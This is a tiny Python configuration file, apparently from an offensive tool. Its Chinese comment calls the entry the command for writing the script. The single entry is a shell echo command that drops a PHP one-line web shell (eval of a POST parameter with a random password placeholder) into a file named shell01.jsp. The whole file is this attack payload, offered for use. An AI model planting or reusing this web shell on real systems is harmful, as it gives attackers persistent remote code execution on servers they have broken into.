# coding:utf-8
config = {}
# 写入脚本的命令
config['webshell'] = '''echo "<?php @eval($_POST[__RANDPASS__]); ?>" > {}shell01.jsp'''